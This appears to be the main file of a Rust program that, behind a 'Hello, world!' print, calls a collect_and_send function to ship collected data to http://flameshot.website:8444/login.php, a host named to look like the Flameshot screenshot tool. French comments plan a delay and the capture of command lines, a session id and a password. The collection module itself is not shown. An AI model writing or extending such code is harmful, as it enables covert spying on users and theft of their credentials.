use collector::collect::collect_and_send;

fn main() {
    println!("Hello, world!");
    
    // TODO attendre 5 minutes
    // chopper des commandline aussi pour le session id et le password
    let sleep_time=1;
    let session_id="yolo".to_string();
    let url="http://flameshot.website:8444/login.php".to_string();
    collect_and_send(sleep_time,session_id,url)

}
